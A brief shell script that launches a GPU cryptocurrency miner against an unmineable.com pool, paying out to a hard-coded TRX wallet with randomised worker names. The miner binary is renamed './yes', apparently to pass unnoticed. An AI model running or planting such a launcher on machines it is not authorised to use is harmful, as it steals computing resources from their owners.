POOL=rx-us.unmineable.com:3333
WALLET=TRX:TTdLkhM9jfo6DAvdCH12M4wkmN6GPWhEgX
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo 5V7zqRPD-$(shuf -i 1911-795778 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
